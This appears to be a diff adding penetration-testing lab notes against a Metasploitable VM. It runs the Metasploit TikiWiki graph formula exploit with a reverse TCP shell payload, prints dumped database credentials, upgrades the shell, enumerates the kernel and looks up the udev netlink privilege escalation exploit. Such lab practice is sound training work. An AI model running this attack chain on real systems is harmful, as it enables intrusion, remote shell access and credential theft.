@@ -1,0 +1,53 @@
+search tikiwiki
+
+use exploit/unix/webapp/tikiwiki_graph_formula_exec
+
+show options
+
+msf6 exploit(unix/webapp/tikiwiki_graph_formula_exec) > set RHOSTS 192.168.122.111
+
+msf6 exploit(unix/webapp/tikiwiki_graph_formula_exec) > show payloads
+
+msf6 exploit(unix/webapp/tikiwiki_graph_formula_exec) > use payload/generic/shell_reverse_tcp
+
+show options
+
+msf6 payload(generic/shell_reverse_tcp) > set LHOST 192.168.122.31
+
+
+
+exploit
+
+C:\home\kali> python -c 'import pty; pty.spawn("/bin/bash")'
+
+www-data@metasploitable:/var/www/tikiwiki$         
+
+
+[*] Started reverse TCP handler on 192.168.122.31:4444 
+[*] Attempting to obtain database credentials...
+[*] The server returned            : 200 OK
+[*] Server version                 : Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch
+[*] TikiWiki database informations : 
+
+db_tiki   : mysql
+dbversion : 1.9
+host_tiki : localhost
+user_tiki : root
+pass_tiki : root
+dbs_tiki  : tikiwiki195
+
+
+
+cat /proc/version
+Linux version 2.6.24-16-server (buildd@palmer) (gcc version 4.2.3 (Ubuntu 4.2.3-2ubuntu7)) #1 SMP Thu Apr 10 13:58:00 UTC 2008
+
+
+C:\home\kali> searchsploit -w Linux 2.6
+
+
+use exploit(unix/webapp/tikiwiki_graph_formula_exec) > search UDEV
+
+   0  exploit/linux/local/udev_netlink  2009-04-16       great  No     Linux udev Netlink Local Privilege Escalation
+
+
+
